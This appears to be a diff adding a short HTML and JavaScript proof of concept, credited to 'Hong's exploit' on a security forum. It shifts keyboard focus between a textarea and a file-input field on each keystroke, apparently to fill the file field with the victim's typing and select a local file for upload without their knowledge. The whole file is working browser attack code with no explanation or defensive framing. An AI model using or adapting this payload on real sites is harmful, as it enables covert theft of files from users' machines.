@@ -1,0 +1,21 @@
+# based upon Hong's exploit:
+# http://sla.ckers.org/forum/read.php?3,13142
+
+<script>
+
+function Clear() {
+     document.getElementById("label1").htmlFor="file1";
+     document.getElementById("text1").focus();
+}
+
+function Down() {
+     document.getElementById("file1").focus();
+}
+
+</script>
+
+<input type="file" id="file1" name="file1" onkeydown="Clear()" onkeyup="Clear()" />
+<label id="label1" name="label1"></label>
+<br />
+<textarea name="text1" id="text1" onkeydown="Down()">
+</textarea>
